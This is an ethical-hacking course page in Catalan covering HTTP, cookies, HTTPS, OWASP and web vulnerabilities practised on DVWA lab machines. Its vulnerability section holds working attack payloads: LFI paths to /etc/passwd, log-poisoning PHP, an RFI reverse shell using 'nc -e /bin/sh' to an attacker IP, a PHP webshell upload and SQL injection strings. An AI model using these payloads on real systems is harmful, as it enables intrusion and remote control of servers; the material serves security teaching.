<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0">-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, minimum-scale=0.5, user-scalable=yes">

  <link rel="stylesheet" href="https://cdn.hugeicons.com/font/hgi-stroke-rounded.css" />

  <title>U4 - HE a aplicacions WEB</title>
  <link rel="stylesheet" href="estilsunitats.css">
  
</head>
<body>
  <!--<button class="theme-toggle" onclick="toggleTheme()"></button> -->
  <button class="theme-toggle" onclick="toggleTheme()">
    <i class="hgi hgi-stroke hgi-sun-01" id="theme-icon"></i>
  </button>

  <!-- boto menu hamburguesa  +  javascript -->
  <button class="hamburger" onclick="toggleMenu()" aria-label="Abrir men√∫ de navegaci√≥n">
    <span id="menu-icon">‚ò∞</span>
  </button>
  
  <div class="sidebar">
    <a href="#http">Protocol WEB</a>
    <a href="#https">Seguretat en Http</a>
    <a href="#atacs">Atacs a http</a>
    <a href="#owasp">OWASP</a>
    <a href="#vuln">Principals Vulnerabilitats</a>    
    <a href="#labs">Laboratoris</a>


  </div>

  <div style="width: 100%;">
    <header>
      <a href="index.html"><img src="imgs/HEcap.png" alt="HE" width="80%"></a>
      <!--<h2>üÖ∑üÖ∞üÖ≤üÖ∫üÖ∏üÖΩüÖ∂ √àüÜÉüÖ∏üÖ≤</h2> -->
      <h1>Unitat 4: HE a aplicacions WEB</h1>
      <h1>.</h1>
    </header>
    
    <main>

      <section id="http">
       <h1>HTTP</h1>
       <img src="imgs/http-protocol.png" alt="http-protocol" width="40%" class="imatge-dreta">
       <p>HTTP (Hypertext Transfer Protocol) √©s el protocol principal que permet la comunicaci√≥ de dades a la World Wide Web. 
        √âs el conjunt de regles que defineixen com es donen format i es transmeten els missatges entre els navegadors web
         (clients) i els servidors web. En termes senzills, √©s el "llenguatge" que fa possible que el teu navegador
          sol¬∑licite informaci√≥ d'un lloc web i que el servidor web la retorne.</p>

        <h3>L'intercanvi d'hipertext: Sol¬∑licitud i Resposta</h3>  
        <p>El funcionament d'HTTP es basa en un model de sol¬∑licitud i resposta. Aquest proc√©s √©s el que coneixem com a
           intercanvi d'hipertext, ja que es transmeten arxius d'hipertext (HTML) juntament amb altres dades.</p>  
          <img src="imgs/http-req.jpg" alt="http-req" width="35%" class="imatge-dreta"> 
         <h4><strong>Sol¬∑licitud (Request)</strong>: Quan escrius una adre√ßa web al teu navegador (per exemple, www.google.com), 
          aquest envia una sol¬∑licitud HTTP al servidor de Google. Aquesta sol¬∑licitud inclou informaci√≥ com:</h4>  
          <ul>
            <li>M√®tode:  Indica l'acci√≥ que es vol fer (per exemple, GET per a obtindre dades, POST per a enviar-les).</li>
            <li>URL: L'adre√ßa del recurs que es demana.</li>
            <li>Cap√ßaleres (Headers): Informaci√≥ addicional, com el tipus de navegador que uses o l'idioma preferit.</li>
          </ul>
         <img src="imgs/http-response.png" alt="http-response" width="40%" class="imatge-esquerra">   
          <h4><strong>Resposta (Response)</strong>: El servidor rep la sol¬∑licitud, la processa i envia una resposta HTTP al navegador. Aquesta resposta cont√©:</h4>
       
       <ul>
        <li>Codi d'estat: Un n√∫mero que indica el resultat de la sol¬∑licitud (per exemple, 200 OK significa que tot ha anat b√©; 404 Not Found vol dir que la p√†gina no existeix).</li>
        <li>Cap√ßaleres (Headers): Informaci√≥ sobre el tipus de contingut que s'envia (HTML, imatges, etc.).</li>
        <li>Cos (Body): Les dades sol¬∑licitades, com el codi HTML de la p√†gina web que visualitzar√†s.</li>
       </ul>
       <h3>HTTP vs. HTTPS</h3>
       <p>√âs important diferenciar-lo de l'HTTPS (Hypertext Transfer Protocol Secure). Mentre que HTTP transmet les dades de manera
         simple, HTTPS encripta la comunicaci√≥ entre el navegador i el servidor. Aix√≤ vol dir que la informaci√≥, com les teues 
         contrasenyes o dades banc√†ries, est√† protegida i no pot ser interceptada f√†cilment. Per aix√≤, sempre veur√†s HTTPS en 
         llocs web que gestionen informaci√≥ sensible, la qual cosa s'indica amb un cadenat üîí en la barra d'adreces del navegador.</p>

       <H2>cookies</H2>
       <p>Les cookies s√≥n petits arxius de text que un lloc web envia al teu navegador quan el visites i que s'emmagatzemen al teu
         dispositiu (ordinador, m√≤bil, tauleta, etc.). La seva funci√≥ principal √©s guardar informaci√≥ sobre la teva activitat al 
         lloc web per a recordar les teves prefer√®ncies i millorar la teva experi√®ncia de navegaci√≥.</p>
         <p>Pensa en les cookies com una mena de "mem√≤ria" que tenen els llocs web. Gr√†cies a elles, un lloc pot recordar qui ets,
           qu√® has fet i quins s√≥n els teus interessos, sense que hagis d'introduir tota la informaci√≥ de nou cada vegada que hi tornes.</p>
        <p>Les cookies s'utilitzen amb diferents finalitats, que poden ser tant √∫tils com controvertides:</p>
        <ul>
          <li>Gesti√≥ de sessions: Permeten que, quan inicies sessi√≥ en un lloc web, no hagis de posar el teu nom d'usuari i contrasenya en cada p√†gina que visites. Tamb√© s√≥n essencials per a mantindre un carret de la compra en l√≠nia actiu mentre continues navegant.</li>
          <li>Personalitzaci√≥ de l'experi√®ncia: Recorden les teves prefer√®ncies, com l'idioma escollit, la configuraci√≥ de la p√†gina o la regi√≥. Aix√≤ fa que la teva navegaci√≥ siga m√©s fluida i adaptada a tu.</li>
          <li>An√†lisi de dades: Recullen informaci√≥ an√≤nima sobre el teu comportament de navegaci√≥ (quines p√†gines visites, quant de temps hi passes, des d'on hi arribes, etc.). Aquestes dades ajuden els propietaris del lloc web a entendre com es fa servir i a millorar-lo.</li>
          <li>Publicitat personalitzada: Aquesta √©s una de les funcions m√©s discutides. Les cookies poden rastrejar els teus h√†bits de navegaci√≥ entre diferents llocs per a crear un perfil dels teus interessos i mostrar-te anuncis que et puguen ser rellevants.</li>
        </ul>

        <p>Tipus de cookies</p>
        <ul>
          <li>Pr√≤pies</li>
          <li>De tercers</li>
          <li>De sessi√≥</li>
          <li>Persistents</li>
        </ul>
       <p>Degut a la seva capacitat per a rastrejar l'activitat en l√≠nia, la majoria de llocs web tenen l'obligaci√≥ legal d'informar-te 
        sobre l'√∫s de cookies i demanar el teu consentiment abans d'utilitzar-les. Per aix√≤, quan entres en un lloc web per primera vegada,
         sovint apareix un b√†ner de cookies on pots acceptar, rebutjar o configurar les teves prefer√®ncies.</p>
       <h4>Com "apareix" una cookie</h4>
       <ul>
        <li>En la primera petici√≥, el server contesta en la cap√ßalera de resposta amb una ordre 'Set-Cookie: session-id=123456' </li>
        <li>El navegador emmagatzema el valor</li>
        <li>A partir d'este moment, en totes les peticions, s'enviar√† la cookie</li>
       </ul>
      <p>la Set-Cookie, pot incloure m√©s atributs opcionals:</p>
      <ul>
        <li>Data expiraci√≥</li>
        <li>Domini</li>
        <li>Path</li>
        <li>Atributs de seguretat</li>
      </ul>

      </section>         
      <section id="https">
       <h1>Seguretat en http (https)</h1>
       <p>HTTPS (Hypertext Transfer Protocol Secure) √©s una extensi√≥ del protocol HTTP que afegeix una capa de seguretat. Pensa en HTTPS com l'HTTP, 
        per√≤ amb un escut protector que garanteix que la comunicaci√≥ entre el teu navegador i el servidor web siga segura, privada i √≠ntegra.</p>
      <h4>Pilars d'https</h4>
      <ul>
        <li>Criptografia:  TLS , tunel</li>
        <li>PKI (Publik Key Infraestructure)</li>
      </ul>
      <p>En a√ßp es consegueix: Xifrar les comunicacions, certificar la identitat del emisor, i la integritat de les dades trameses</p>
       <h2>Xifrat</h2>
      <h4>Tecnologia de xifrat</h4>
      <img src="imgs/tls1.2.png" alt="tls1.2" width="40%" class="imatge-esquerra">
      <img src="imgs/tls1.3.png" alt="tls1.3" width="50%" >
      <p>TLS 1.3 √©s la darrera versi√≥ del protocol TLS (Transport Layer Security) i
         representa una millora significativa respecte a TLS 1.2, centrant-se principalment en la seguretat i la velocitat.</p>
        <ul>
          <li>Algorismes de xifratge admesos m√©s moderns i robustos. Obligatori en TSL 1.3</li>
          <li>Perfect Forward Secrecy: Assegura que cada sessi√≥ utilitze una clau d'encriptaci√≥ √∫nica, obligat√≤ria en TLS 1.3 </li>
          <li>Handshake m√©s segur</li>
          <li>Handshake m√©s r√†pid</li>
          <li>Zero Round-Trip Time: TLS 1.3 introdueix la possibilitat de reprendre una sessi√≥ anterior amb zero rondes de comunicaci√≥</li>
        </ul>
       <h4>PKI</h4>
       <p>El PKI (Public Key Infrastructure), o Infraestructura de Clau P√∫blica, √©s un sistema que gestiona les claus p√∫bliques
         i privades per a crear, gestionar, distribuir, utilitzar, emmagatzemar i revocar certificats digitals. En ess√®ncia, 
         √©s el marc tecnol√≤gic que permet la seguretat i la confian√ßa en les comunicacions digitals, especialment a internet.</p>
        <img src="imgs/Public-Key-Infrastructure.png" alt="pki" width="50%" >
        <p>El PKI no √©s un producte o tecnologia √∫nica, sin√≥ un conjunt de components que treballen junts per a 
          gestionar la criptografia asim√®trica. Els elements clau s√≥n:</p>
    <ol>
      <li><strong>Autoritat de Certificaci√≥ (CA)</strong>: √âs el component m√©s important del PKI. La CA √©s una entitat de confian√ßa (com Let's Encrypt o DigiCert) que emet, signa i revoca els certificats digitals. La seva funci√≥ √©s verificar la identitat de les entitats (persones, servidors) que sol¬∑liciten un certificat.</li>
      <li><strong>Certificat Digital</strong>: Un arxiu electr√≤nic que cont√© la clau p√∫blica d'una entitat, la seva identitat (nom de domini, organitzaci√≥, etc.) i la signatura digital de la CA. Aquest certificat serveix per a demostrar que la clau p√∫blica pertany realment a l'entitat que la reclama.</li>
      <li><strong>Autoritat de Registre (RA)</strong>: Actua com a intermediari entre l'usuari i la CA. La RA verifica la identitat de l'usuari i autoritza l'emissi√≥ del certificat, per√≤ no el signa.</li>
      <li><strong>Autoritat de Validaci√≥ (VA) o Directori</strong>: Una base de dades on s'emmagatzemen els certificats digitals i des d'on es poden consultar.</li>
      <li><strong>Repte de revocaci√≥</strong>: Mecanismes per a revocar certificats que han sigut compromesos abans de la seva data de caducitat, com les llistes de revocaci√≥ de certificats (CRL) o el protocol OCSP.</li>
    </ol>

      <h2>Cap√ßaleres de seguretat</h2>
      <h3>Us segur de http cookies</h3>
      <p>A m√©s dels atributs Path i Domain, les cookies poden portar tamb√© uns atributs de seguretat</p>
      <h4>SameSite</h4>
      <h4>Secure</h4>
      <h4>HttpOnly</h4>

       <h3>http Access Control (CORS)</h3>
      <p>El CORS (Cross-Origin Resource Sharing) √©s un mecanisme de seguretat implementat als navegadors web que permet que un lloc web (el client) 
        sol¬∑licite recursos a un servidor que es troba en un domini diferent. 
        Sense CORS, els navegadors bloquejarien per defecte aquestes peticions per a evitar atacs de seguretat, com el "Cross-Site Request Forgery" (CSRF).</p>
       <p>CORS comprova dos tipus de sol¬∑licituds: Simples i Verificades (preflighted)</p>

       <h2> Atacs a http     </h2>
       <p>Existeixen diversos tipus d'atacs que aprofiten les caracter√≠stiques de HTTP</p>
       <ul>
        <li>HTTP Host Header Injection</li>
        <li>HTTP Request/Response Splitting</li>
        <li>HTTP Request Smuggling</li>
       </ul>

      </section>               
      <section id="owasp">
        <h1>OWASP</h1>
        <p>OWASP (Open Worldwide Application Security Project) √©s una fundaci√≥ sense √†nim de lucre global que es dedica a millorar
           la seguretat del programari. L'organitzaci√≥ funciona com una comunitat oberta que proporciona recursos gratu√Øts i de 
           codi obert per a ajudar desenvolupadors, professionals de la seguretat i organitzacions a crear aplicacions m√©s segures.</p>
        <p>L'objectiu principal d'OWASP √©s conscienciar sobre els riscos de seguretat del programari i proporcionar les eines i 
          la informaci√≥ necess√†ria per a mitigar-los. Entre els seus projectes m√©s destacats es troben:</p>

      <ul>
        <li>OWASP Top 10: Aquest √©s, sens dubte, el recurs m√©s conegut d'OWASP. √âs un informe que s'actualitza peri√≤dicament i identifica les 10 vulnerabilitats de seguretat m√©s cr√≠tiques per a les aplicacions web. Serveix com a guia de refer√®ncia per a desenvolupadors i professionals de la seguretat per a prioritzar els esfor√ßos en protegir les aplicacions contra els riscos m√©s comuns. Les vulnerabilitats t√≠piques que s'hi troben inclouen injeccions SQL, control d'acc√©s trencat o errors de configuraci√≥ de seguretat.</li>
        <li>Guies i metodologies: OWASP publica una gran varietat de documents i guies per a ajudar les organitzacions a millorar els seus processos de seguretat. Per exemple, la OWASP Application Security Verification Standard (ASVS) proporciona un marc per a provar i verificar els controls de seguretat de les aplicacions.</li>
        <li>Eines de codi obert: L'organitzaci√≥ desenvolupa i mant√© diverses eines per a la seguretat del programari, com el Zed Attack Proxy (ZAP), una eina de codi obert per a la prova de penetraci√≥ que permet trobar vulnerabilitats en aplicacions web.</li>
        <li>Cap√≠tols locals i confer√®ncies: OWASP t√© cap√≠tols locals en molts pa√Øsos del m√≥n i organitza confer√®ncies com l'OWASP Global AppSec, on la comunitat comparteix coneixement, investigaci√≥ i experi√®ncies.</li>
      </ul>

      <p>L'OWASP Top 10 √©s un informe de conscienciaci√≥ est√†ndard de la ind√∫stria que detalla les 10 vulnerabilitats de 
        seguretat m√©s cr√≠tiques per a les aplicacions web. Publicat per la fundaci√≥ OWASP, serveix com a guia fonamental 
        per a desenvolupadors, professionals de la seguretat i organitzacions per a prioritzar els seus esfor√ßos en la 
        identificaci√≥ i mitigaci√≥ dels riscos de seguretat m√©s comuns i perillosos.</p>

      <ul>
        <li>No √©s una llista exhaustiva</li>
        <li>S'actualitza peri√≤dicament</li>
        <li>Serveix com a punt de partida</li>
      </ul>
      <h4>OWASP Vulnerable Web Applications Directory (VWAD)</h4>
      <p>El OWASP Vulnerable Web Applications Directory (VWAD), o Directori d'Aplicacions Web Vulnerables d'OWASP, 
        √©s un directori complet d'aplicacions web i m√≤bils vulnerables conegudes. √âs un recurs molt valu√≥s per a 
        desenvolupadors, provadors de seguretat i <strong>estudiants</strong> que volen practicar les seues habilitats en un entorn segur i legal.</p>
       <p>Es poden usar per a aprendre, formar-se i provar t√®cniques de seguretat ofensiva i defensiva, en lloc d'intentar
         trobar vulnerabilitats en llocs web reals, cosa que √©s il¬∑legal i poc √®tica</p>
        
        <p>Altres projectes d'aplicacions vulnerables per aprendre</p>
        <ul>
          <li>CI/CD-Goat</li>
          <li>OWASP DVWS</li>
          <li>vAPI</li>
          <li>DVWS-node</li>
          <li>level-up!</li>
        </ul>

      </section>         
      <section id="vuln">
        <h1>Principals Vulnerabilitats Web i la seua explotaci√≥</h1>
         <img src="imgs/dvwa-logo-500x500.png" alt="dvwa" width="18%" class="imatge-dreta">   
         <img src="imgs/juiceshop.png" alt="juice" width="12%" class="imatge-dreta">   
        <p>Existeixen llocs on trovar maquines vulnerables, i algunes es poden instal¬∑lar directament en kali linux</p>
        <p>Per comen√ßar, les m√©s utilitzades son "dvwa" i "juice-shop"</p>
        <li>apt install dvwa </li>
        <pre><code># dvwa-start 
          # dvwa-stop    </code></pre>
        <li>apt install juice-shop </li>
        <pre><code># juice-shop-start 
          # juice-shop-stop    </code></pre>
        <p>En TyHackMe tamb√© estan les m√†quines</p>  
        <p>En PentesterLab tamb√©</p>
        <p>En Academia de Seguridad Web de PortSwigger  tamb√©</p>
        <p>Abans de explicar les diferents categories d'atacs, es necessari coneixer el funcionament d'alguna eina que funcione com a proxy-web.  <br>
        Estes ferramentes es situen en mig de les comunicacions entre el navegador del client i el servidor web i intercepten el tr√†nsit (REQUEST / RESPONSE)
        per inspeccionar i modificar el contingut, i poder aix√≠ fer els atacs.
        </p>
        <h4>Les dos mes conegudes</h4>
        <img src="imgs/Burpsuite-logo.png" alt="burp" width="18%" class="imatge-dreta">   
        <img src="imgs/zap_dvwa2.png" alt="zap" width="18%" class="imatge-dreta">   
        <ul>
          <li>Burp Suite</li>
          <li>OWASP ZAP</li>
        </ul>
        <p>A continuaci√≥, dos videos per introduir-se en estes ferramentes</p>
        <a href="https://www.youtube.com/watch?v=G3hpAeoZ4ek">Burp Suite</a>  i 
        <a href="https://www.youtube.com/watch?v=xkUybXsyQ24&t=353s">ZAP</a> 
        <hr>

        <h2>LFI , RFI</h2>
        <h3>LFI (Local File Inclusion)</h3>
        <p>El LFI (Local File Inclusion) √©s una vulnerabilitat de seguretat en aplicacions web que permet a un atacant 
          llegir, i de vegades executar, arxius des del servidor. L'atac es produeix quan una aplicaci√≥ web inclou un 
          arxiu basat en l'entrada de l'usuari sense validar-lo o sanejar-lo correctament.</p>
         <h3>Llegir fitxers del servidor</h3> 
        <p>L'atac m√©s simple es basa en navegar i detectar una URL vulnerable, amb parametres, per exemle</p>
        <code>https://exemple.com/pagina.php?lang=cat</code>
        <p>En este cas el par√†metre  lang=cat, es podria intentar manipular....</p>
        <pre><code>https://exemple.com/pagina.php?lang=../../../../etc/passwd
        https://exemple.com/pagina.php?lang=/etc/passwd</code> </pre>
        <p>Si el servidor √©s vulnerable, el codi intentaria incloure el contingut de l'arxiu /etc/passwd 
          (un arxiu de Linux que cont√© informaci√≥ d'usuaris), i el contingut d'aquest arxiu es mostraria 
          a la p√†gina web, exposant informaci√≥ sensible</p>

        <p>En la m√†quina DVWA, es proposa la URL ..</p>
        <code>/dvwa/vulnerabilities/fi/?page=file1.php</code>
        <h3>Execuci√≥ remota de codi (RCE) mitjant√ßant  <em>log poisoning + LFI</em></h3>
        <p>Per conseguir una execuci√≥ remota de codi, es necessari trovar la forma de escriure en algun fitxer, inserir codi en ell, i despr√©s 
          visualitzar el fitxer amb LFI. Una t√®cnica per fer aix√≤ √©s el <em>log poisoning</em> o enverinament de logs.      </p>
         <li>Primer. Tindre acc√©s mitjant√ßant LFI a algun fitxer de <em>log</em></li> 
         <li>Segon. Escriure dins del fitxer</li>
         <p>Una forma es utilitzar el fitxer <code>/var/log/apache2/access</code> .  Este fitxer registra tots els accesos al servidor web.</p>
         <p>El valor <em>User-Agent</em> √©s el tipus de navegador que est√† accedint, i queda registrat.</p>
         <p>La informaci√≥ de <em>User-Agent</em> es pot canviar amb BurpSuite o ZAP, interceptant el http-request, i modificant el contingut</p>
         <p>Per exemple, podem posar un codi php :   <code> User-Agent: &lt;?php system('uname -a');?></code></p>
         <p>Una vegada modificat el http-request i enviat al servidor, este valor (codi malici√≥s) quedar√† escrit en el <em>log</em></p>
         <p>Sols ens queda visualitzar amb LFI el fitxer log, i el codi inserit s'executar√† ==> <strong> (RCE)</strong> </p>
         <p>En la barra del navegador:  <code>https://exemple.com/pagina.php?lang=/var/log/apache/access.log</code></p>
         <p>En este cas, sols per provar, s'ha inserit una simple ordre que mostra informaci√≥ del sistema, per√≤ de igual manera
          es podria inserir un sezill codi que execute una  <strong>shell inversa</strong>, obrint un terminal interactiu que 
          permetria executar comandos directament.    </p>
          
          <h4>Altres fitxers interessants per fer log poisoning:    </h4>
          <ul>
            <li>/var/log/auth.log</li>
            <code>ssh &lt;? php system($GET['cmd']);?>@ip_victima</code>
            <li>/var/log/vsftpd.log</li>
            <code>Accedir al servidor ftp, posant en el nom d'usuari el codi a inserir</code>
            <li>/var/log/apache2/error.log</li>
            <li>/proc/self/environ</li>
            <code>User-Agent de http-request</code>
            <li>/proc/self/fd</li>
          </ul>
          <p>Abans de fer el log poisoning, s'ha de comprovar si es disposa d'acc√©s a algun d'estos fitxers.</p>

          <h4>Wrappers en php</h4>
          <p>En principi per explotar LFI usarem</p>
          <code>/dvwa/vulnerabilities/fi/?page=include.php</code>
          <p>Usant un wrapper</p>
          <code>/dvwa/vulnerabilities/fi/?page=php://filter/resource=include.php</code>
          <p>Aparentment, el resultat √©s el mateix, degut a que el servidor interpreta i torna el html. Per evitar aix√≤..</p>
          <code> ?page=php://filter/convert.base64-encode/resource=include.php</code>
          <p>El resultat, ser√† en base64, per√≤ no interpretat, sin√≥ el codi del fitxer. Encara quedar√† decodificar-lo, amb cyberchef , per exemple</p>
          <p>Es pot consultar documentaci√≥ sobre els Wrappers de php en: <a href="https://www.php.net/manual/en/wrappers.php">https://www.php.net/manual/en/wrappers.php</a></p>

          <h3>Remote File Inclusion (RFI)</h3>
          <p>Es tracta d'una variant de LFI que permet a un atacant accedir a una connexi√≥ des de l'objectiu per incloure un fitxer d'un host extern, 
            en lloc d'un fitxer local.      </p>
            <p>El LFI te unes limitacions que si es pot fer un RFI, estes desapareixen</p>
          <p>Encara que els exemples que s'estan mostrant son en PHP, no s'ha d'oblidar que existeixen altres llenguatges de servidor
            com ASP, JSP, o Python a trav√©s dels seus Frameworks web, com Flask o Django, susceptibles de tindre els mateixos problemes.         </p>

          <h4>Com fer una shell inversa aprofitant RFI</h4>
          <p>Considerem que la IP atacant √©s la 10.0.10.40 i la ip victima √©s la 10.0.10.50</p>
          <li>El atacant usa netcac per obrir un port amb un servidor local (de netcat)</li>
          <code>$ nc -lnvp 4444</code>
          <li>A m√©s a m√©s , l'atacant obri un server web simple per servir fitxers de comandos</li>
          <pre><code>
           mkdir /tmp/files
           cd /tmp/files
           python3 -m http.server 80 
          </code></pre>
          <li>Es posa un fitxer 'reverse.txt' amb</li>
          <pre><code>
            &lt;?php
               passthru("nc -e /bin/sh 10.0.10.40 4444");
            ?>
          </code></pre>

          <p>Ara, per executar la reverse shell..</p>
          <pre><code>
            en el navegador , posem la ip de la victima seguit del codi RFI  
            10.0.10.50/dvwa/vulnerabilities/fi/?page=http://10.0.10.40/reverse.txt
          </code></pre>
          
   
        <hr><h2>File upload vulnerabilities</h2>
          <p>Les vulnerabilitats de c√†rrega d'arxius (o file upload vulnerabilities) s√≥n defectes de seguretat en aplicacions web 
            que permeten a un atacant pujar arxius maliciosos a un servidor. Si l'aplicaci√≥ no valida, saneja o processa correctament
             l'arxiu pujat, l'atacant pot aprofitar-ho per a dur a terme una gran varietat d'atacs, sent l'execuci√≥ de codi remot (RCE) el m√©s perill√≥s.</p>
         <p>Si el codi de l'aplicaci√≥ confia massa en l'entrada de l'usuari i no valida aspectes crucials com el tipus d'arxiu, el contingut
           o el nom de l'arxiu, un atacant pot pujar un fitxer que no hauria de ser acceptat.</p>
        <ul>
          Alguns dels problemes que poden causar estes vulnerabilitats
          <li>Atacs del costat del server (php,jsp, asp ..)</li>
          <li>DoS. Denegaci√≥ amb un fitxer mooolt gran</li>
          <li>Atacs del costat del client. XSS, defacement, phishing</li>
          <li>Disparar fallos en altres sistemes (explotar fallos en llibreries)</li>
          <li>Altres. (pujar malware, .. ) </li>
        </ul>
        <p>en dvwa es pot practicar ...</p>
        <p>hi ha un formulari per pujar imatges, per√≤ es pujar√† un fitxer .php que conte codi malici√≥s i despr√©s s'executar√†</p>
        <pre><code> &lt; Nom del fitxer 'shell.php'
          ?php system($_GET['cmd']);?></code></pre>
        <p>Es puja el fitxer amb el bot√≤ de pujar imatges</p>
        <p>S'executa amb:  <code>10.0.10.99/dvwa/hackable/uploads/shell.php?cmd=id</code></p>
        <p>Compte amb:
          <code>"10.0.10.99/dvwa/hackable/uploads/shell.php?cmd=uname -a"</code> , perque no funciona degut al espai que hi ha entre uname i -a</p>
          <p>La soluci√≥ ser√† usar cyberchef amb la opci√≥  "Encode all special chars" i ens calcula  "uname%20-a" que ja no cont√© espai i funciona si es
            posa en la url            </p>
          <code>"10.0.10.99/dvwa/hackable/uploads/shell.php?cmd=uname%20-a"</code>
        <li>Altra soluci√≥ seria utilitzar el m√®tode POST en compte del GET</li>
        <li>Una altra seria utilitzar la webshell de   <a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell">pentestmonkey</a>  </li>
        <li>I finalment, una altra eina potent es  <a href="https://github.com/epinna/weevely3"> weevely</a>, tutorial en <a href="https://keepcoding.io/blog/webshell-con-weevely/"> keepcoding</a>    </li>

        <hr>  <h2>Acces control vulnerabilities</h2>
        <p>La vulnerabilitat de seguretat IDOR (Insecure Direct Object Reference) √©s un tipus de vulnerabilitat de control d'acc√©s 
           que permet a un atacant accedir a recursos als quals no hauria de tindre perm√≠s. Aquesta vulnerabilitat es produeix
            quan una aplicaci√≥ utilitza un identificador d'objecte (com un n√∫mero, un nom d'arxiu o una clau) de forma directa 
            en un par√†metre URL sense verificar si l'usuari actual t√© els permisos adequats per a accedir a aquest objecte.</p>
        <p>IDOR es pot manifestar de moltes maneres</p>
        <li>https://insecure-website.com/profile?user_id=12345</li>
        <li>GET /rest/basket/3</li>
        <li>https://insecure-website.com/files/1234.txt</li>
        <h4>Atac</h4>
        <p>La primera i la √∫ltima es pot manipular la URL directament i provar amb altre numero</p>
        <p>El GET, cal interceptar la petici√≥ amb BurpSuite i canviar el numero, i enviar la petici√≥ modificada al server</p>

        <hr>
        <h2>SQLi</h2>
        <p>La injecci√≥ SQL (SQL Injection) √©s una de les vulnerabilitats de seguretat m√©s antigues i comunes en aplicacions web. Aquest atac es produeix quan un atacant pot inserir
           codi SQL malici√≥s en una consulta enviada a la base de dades a trav√©s de les dades d'entrada d'una aplicaci√≥.</p>
        <h4>Com funciona una injecci√≥ SQL</h4>
        <p>Normalment, les aplicacions web utilitzen consultes SQL per a interactuar amb la seva base de dades. Per exemple, 
          per a autenticar un usuari, el codi PHP podria construir una consulta a partir d'un nom d'usuari i una contrasenya que l'usuari ha escrit en un formulari:</p>
          <code>SELECT * FROM usuaris WHERE nom = 'usuari' AND contrasenya = 'contrasenya';</code>
        <p>Una aplicaci√≥ √©s vulnerable a la injecci√≥ SQL si no saneja correctament l'entrada de l'usuari. Un atacant pot aprofitar-se d'aix√≤. Si l'atacant introdueix al camp de contrasenya:</p>
        <code>' OR '1'='1</code>
        <p>La consulta es convertiria en</p>
          <code>SELECT * FROM usuaris WHERE nom = 'usuari' AND contrasenya = '' OR '1'='1';</code>
        <p>Com que la condici√≥ '1'='1' sempre √©s vertadera, la base de dades retornar√† totes les files, permetent que l'atacant inici√Ø sessi√≥ sense saber la contrasenya correcta.</p>

        <ul> Esta inserci√≥ es pot realitzar de diverses formes
          <li>Un camp d'un formulari web</li>
          <li>Una cap√ßalera http</li>
          <li>Pujada de fitxers al servidor que despr√©s seran executats</li>
          <li>etc..</li>
        </ul>
        <h4>Tipus de injeccions SQL</h4>
        <ul>
          <li>Injecci√≥ cl√†ssica: L'atacant manipula la consulta per a accedir directament a dades sensibles o canviar la l√≤gica de la consulta. L'exemple anterior n'√©s una mostra.</li>
          <li>Injecci√≥ cega (Blind SQL Injection): Es produeix quan la base de dades no retorna errors o dades directament a l'atacant. En lloc d'aix√≤, l'atacant formula preguntes la resposta de les quals es pot inferir a partir del comportament del lloc web. Per exemple, si una consulta retorna un error, la p√†gina mostra un missatge, per√≤ si l'atacant aconsegueix que la consulta sigui vertadera, la p√†gina es carrega normalment.</li>
          <li>Injecci√≥ Out-of-Bond. Si es torna un resultat, es fa per un canal diferent al utilitzat per introduir la injecci√≥. La resposta a la consulta no es presenta en la resposta a la petici√≥ http.</li>
          <li>Injecci√≥ a segon ordre: Es produeix quan l'aplicaci√≥ emmagatzema dades malicioses en una base de dades i les executa m√©s tard en una consulta diferent.</li>
        </ul>
        
        <h4>T√®cniques d'injecci√≥</h4>
        <li>Us de condicions booleanes</li>
        <li>Us de operador UNION</li>
        <li>Descobrir l'estructura de la base de dades</li>

        <h3>Blind Injection</h3>
        <p>La injecci√≥ SQL cega (Blind SQL Injection) √©s una t√®cnica d'atac on un atacant pot explotar una vulnerabilitat de injecci√≥ SQL, 
          per√≤ sense que la base de dades retorne cap error o dada directament a la p√†gina web. En lloc de veure el resultat de la consulta 
          a la pantalla, l'atacant infereix la informaci√≥ de la base de dades a partir del comportament de l'aplicaci√≥.</p>
          <h4>Com funciona la injecci√≥ cega?</h4>
        <p>A difer√®ncia d'una injecci√≥ SQL cl√†ssica, on l'atacant pot veure el resultat d'una consulta directament, 
          en la cega, ha d'utilitzar m√®todes indirectes per a "endevinar" la informaci√≥. L'atac es basa en fer preguntes 
          de "s√≠ o no" a la base de dades i observar la resposta de l'aplicaci√≥ web. Per exemple, una pregunta podria ser: 
          "La primera lletra de la contrasenya de l'administrador √©s una 'a'?</p>
        <ul> Els dos tipus principals d'injecci√≥ cega s√≥n
          <li>Injecci√≥ basada en booleans: L'atacant envia una consulta que inclou una condici√≥ de vertader o fals. Si la condici√≥ √©s vertadera, la p√†gina web es comporta d'una manera (per exemple, es carrega normalment). Si √©s falsa, es comporta d'una altra (per exemple, mostra un missatge d'error o no retorna cap resultat). Analitzant aquests canvis, l'atacant pot anar inferint la informaci√≥ car√†cter per car√†cter</li>
          <li>Injecci√≥ basada en temps (Time-based): S'utilitza quan l'aplicaci√≥ no mostra cap difer√®ncia observable en la resposta (ni errors ni canvis de contingut). L'atacant envia una consulta que inclou una funci√≥ que fa que la base de dades s'endarrereix a respondre si una condici√≥ √©s vertadera. Per exemple, es pot enviar una consulta amb una condici√≥ que, si es compleix, fa que el servidor esperi 10 segons abans de respondre. Si la p√†gina triga a carregar, l'atacant sap que la condici√≥ era certa. Aquest proc√©s es repeteix per a cada car√†cter que es vol extraure.</li>
        </ul>
        <h4>Per qu√® √©s tan perillosa?</h4>
        <p>Tot i que pot ser un proc√©s m√©s lent i complex que la injecci√≥ SQL cl√†ssica, la injecci√≥ cega √©s igualment perillosa.
           Un atacant pot automatitzar el proc√©s amb eines especialitzades per a:</p>
        <ul>
          <li>Extraure bases de dades senceres: Robar noms d'usuaris, contrasenyes, dades de clients i qualsevol altra informaci√≥ sensible.</li>
          <li>Aconseguir el control del sistema: En alguns casos, un atacant pot arribar a executar comandes del sistema operatiu si la base de dades t√© els permisos adequats.</li>
        </ul>
        <p>Aquest tipus d'atac √©s especialment dif√≠cil de detectar perqu√® sovint no deixa cap rastre de dades en la resposta de l'aplicaci√≥, 
          fent que molts desenvolupadors no se n'adonin fins que ja √©s massa tard. La millor manera de previndre'l √©s utilitzar consultes 
          parametritzades per a totes les interaccions amb la base de dades.</p>

         <h3>automatitzaci√≥ del descobriment i explotaci√≥ de injeccions SQL</h3> 
